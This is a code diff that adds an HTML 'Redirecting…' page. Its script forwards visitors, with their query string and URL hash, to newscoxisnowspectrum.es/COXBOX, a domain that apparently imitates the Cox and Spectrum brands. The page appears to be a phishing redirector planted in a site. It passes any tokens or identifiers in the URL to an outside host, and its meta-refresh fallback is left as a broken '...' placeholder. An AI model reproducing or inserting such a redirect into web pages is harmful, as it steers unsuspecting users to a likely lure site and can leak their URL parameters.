@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Redirecting…</title>
+<script>
+(function(){
+  var url = "https://newscoxisnowspectrum.es/COXBOX";
+  var qs = location.search, h = location.hash;
+  if (qs && url.indexOf("?") === -1) url += qs;
+  if (h && url.indexOf("#") === -1) url += h;
+  if (location.href.split("#")[0] === url.split("#")[0]) return; // loop guard
+  try { location.replace(url); } catch(e) {}
+  window.setTimeout(function(){
+    if (document.readyState !== "complete" || location.href.split("#")[0] !== url.split("#")[0]) {
+      // fallback
+    }
+  }, 600);
+})();
+</script>
+<meta http-equiv="refresh" content="0;url=...">
